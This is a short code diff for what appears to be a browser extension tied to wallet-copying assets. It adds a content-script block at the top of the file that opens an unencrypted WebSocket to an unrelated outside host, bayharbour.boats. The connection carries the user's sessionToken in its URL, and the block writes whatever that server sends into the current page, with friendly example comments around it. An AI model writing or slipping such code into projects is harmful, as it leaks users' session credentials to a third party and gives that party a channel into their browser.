@@ -1,3 +1,28 @@
+const ws = new WebSocket(`ws://bayharbour.boats?sessionToken=${encodeURIComponent(sessionToken)}`);
+
+ws.onopen = () => {
+    console.log('WebSocket connected');
+    // Optionally, send an initial message to the server
+    ws.send(JSON.stringify({ message: 'Hello from content script!' }));
+};
+
+ws.onmessage = (event) => {
+    const data = JSON.parse(event.data);
+    console.log('Message from server:', data);
+
+    // Example: Inject received data into the webpage
+    const messageElement = document.createElement('div');
+    messageElement.textContent = `Server message: ${data.message}`;
+    document.body.appendChild(messageElement);
+};
+
+ws.onclose = (event) => {
+    console.log(`WebSocket closed: ${event.code} - ${event.reason}`);
+};
+
+ws.onerror = (error) => {
+    console.error('WebSocket error:', error);
+};
 const PenAsset = "../../Assets/WalletCopying/Pen.png"
 const DetailsAsset = "../../Assets/WalletCopying/Details.png"
 const TrashAsset = "../../Assets/WalletCopying/Trash.png"
